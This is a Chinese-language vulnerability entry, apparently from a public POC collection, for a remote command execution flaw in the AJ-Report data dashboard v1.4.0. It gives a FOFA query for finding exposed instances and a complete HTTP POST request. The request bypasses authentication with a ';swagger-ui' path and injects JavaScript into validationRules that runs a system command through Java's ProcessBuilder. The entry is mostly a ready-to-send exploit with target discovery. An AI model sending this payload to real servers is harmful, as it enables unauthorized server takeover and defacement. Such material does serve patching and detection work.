## AJ-Report开源数据大屏存在远程命令执行漏洞

该平台可以通过post方式在validationRules参数对应值中进行命令执行，可以获得服务器权限，登陆管理后台接管大屏。如果被不法分子利用，书写反动标语，危害后果十分严重。

## 影响版本
```
最新版本v1.4.0
```

## fofa
```
title="AJ-Report"
```

## poc
```
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close

{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
```

![image](https://github.com/wy876/POC/assets/139549762/8e96cef4-ea6f-4600-b622-9deb360ae42e)


## 漏洞来源
- https://gitee.com/anji-plus/report/issues/I9HCB2
